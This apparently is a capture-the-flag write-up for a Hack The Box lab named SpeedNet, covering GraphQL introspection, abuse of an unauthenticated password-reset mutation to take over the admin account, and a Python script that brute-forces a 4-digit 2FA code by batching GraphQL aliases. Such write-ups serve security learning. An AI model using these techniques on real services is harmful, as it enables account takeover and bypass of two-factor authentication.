---
title: SpeedNet
summary: "HTB Bug Bounty CTF workflow: abuse GraphQL password reset and 2FA to retrieve the flag."
date: 2025-09-04
tag: htb-machines
---



![](/images/posts/SpeedNet_1.png)

>#### The challenge description 
>Speednet is an Internet Service Provider platform that enables users to purchase internet services. We invite you to participate in our bug bounty program to identify any potential vulnerabilities within the application and retrieve the flag hidden on the site. For your testing, we have provided additional email services. Please find the details below: Email Site: `http://IP:PORT/emails/` Email Address: test@email.htb

## **Introduction**
In this challenge, we will exploit a modern web application that uses a `GraphQL API` for user account management and data retrieval. The application includes functionalities like viewing user profiles, enabling two-factor authentication (2FA), and resetting passwords.

## **Vulnerability Discovery & Exploitation**

- By enumerating analyzing the request and response , we can discover
	- `/graph` API is a `graphQL API` 
	- If we enable 2FA, the web app requires an OTP code that is sent to our email during the login process.

- we can perform GraphQL introspection to retrieve the information about its schema, by sending the payload  : 
```json
{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

![](/images/posts/SpeedNet_2.png)
> Now , we have all information about schema

I used the `GetUserProfile` query to retrieve valid users. I successfully retrieved a valid user:
>the 2FA is active

![](/images/posts/SpeedNet_3.png)

There is also a `devForgotPassword` mutation that resets the password without a token, we just need an email (*we can reset the password of any user just using their email*)

![](/images/posts/SpeedNet_4.png)

### Reset admin password

- I send the request with `devForgotPassword` mutation : 

![](/images/posts/SpeedNet_5.png)

- Then , using the token that is in response, i reset the admin's password : 

![](/images/posts/SpeedNet_6.png)

- as we know , the 2FA is active , so we can't log in to admin account without OPT token that is sent to the email

![](/images/posts/SpeedNet_7.png)

### Brute Force the  OPT Code

- The OTP verification process during login works as follows:
    - When we send a request using the `login` mutation, the server generates a **login token**.  <span style="color:rgb(255, 0, 0)">This token is valid for 60 minutes</span>.
    - After the login request, the server generates an **OTP code** and sends it to the user's email.  <span style="color:rgb(255, 0, 0)">The OTP code is valid for 5 minutes only</span>.
    - To complete the login process, we must send a `verifyTwoFactor` mutation with the correct OTP code and the login token.
    - If the OTP is valid, the server finalizes the authentication and grants access.

![](/images/posts/SpeedNet_8.png)

![](/images/posts/SpeedNet_9.png)

- So , we can brute force OPT using `graphQl aliases` .

```python
import requests
from itertools import product

# Setup
url = "http://94.237.120.202:54514/graphql"
token = "4c8c0a40-c4cd-4753-94d9-598c006aa44c" # token from response of login mutation
headers = {
    "Content-Type": "application/json",
    "Origin": "http://94.237.120.202:41222",
    "Referer": "http://94.237.120.202:41222/login",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}

# Create 4-digit OTPs
otps = [''.join(p) for p in product('0123456789', repeat=4)]

batch_size = 150
for i in range(len(otps) - batch_size, -1, -batch_size):
    chunk = otps[i:i + batch_size]

    query = "mutation verifyTwoFactor {"
    for j, otp in enumerate(chunk):
        query += f"""
        try{j}: verifyTwoFactor(token: "{token}", otp: "{otp}") {{
            token
            user {{
                email
                username
            }}
        }}"""
    query += "\n}"
	
    response = requests.post(url, headers=headers, json={"query": query})
    if '"token"' in response.text:
        print("[+] Success!")
        print(response.text)
        break
    else:
        print(f"[-] Tried {chunk[0]} to {chunk[-1]}")
```

Boom! After run this script , i got the Token 

![](/images/posts/SpeedNet_10.png)

Finally, I use this token to log in as an admin user.

![](/images/posts/SpeedNet_11.png)

## the Flag

![](/images/posts/SpeedNet_12.png)
